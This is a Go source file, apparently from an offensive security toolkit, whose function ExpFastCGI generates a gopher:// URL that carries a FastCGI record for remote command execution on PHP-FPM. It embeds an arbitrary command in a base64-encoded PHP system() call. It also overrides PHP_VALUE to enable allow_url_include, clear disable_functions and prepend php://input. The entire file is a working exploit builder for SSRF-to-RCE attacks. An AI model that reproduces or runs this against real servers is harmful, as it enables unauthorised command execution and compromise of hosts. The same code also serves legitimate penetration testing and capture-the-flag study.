package gopher

import (
	"encoding/base64"
	"fmt"
	"net/url"
	"strconv"

	"github.com/virink/virzz/tools/client/fastcgi"
)

// ExpFastCGI -
func ExpFastCGI(addr string, cmd, filename string, encode bool) (string, error) {
	// "/usr/share/php/PEAR.php"
	cmd = fmt.Sprintf(
		`<?php system(base64_decode('%s'));?>`,
		base64.StdEncoding.EncodeToString([]byte(cmd)),
	)
	env := map[string]string{
		"SERVER_SOFTWARE": "virzz - fcgiclient",
		"REMOTE_ADDR":     "127.0.0.1",
		"SERVER_PROTOCOL": "HTTP/1.1",
		"CONTENT_LENGTH":  strconv.Itoa(len(cmd)),
		"REQUEST_METHOD":  "POST",
		"SCRIPT_FILENAME": filename,
		"PHP_VALUE":       "allow_url_include = On\ndisable_functions = \nauto_prepend_file = php://input",
		"DOCUMENT_ROOT":   "/",
	}
	r := fastcgi.NewFastCGIRecord(env, []byte(cmd))
	p := url.QueryEscape(string(r))
	if encode {
		p = url.QueryEscape(replaceFastCGIPayload(p))
	}
	return fmt.Sprintf("gopher://%s/_%s", addr, replaceFastCGIPayload(p)), nil
}
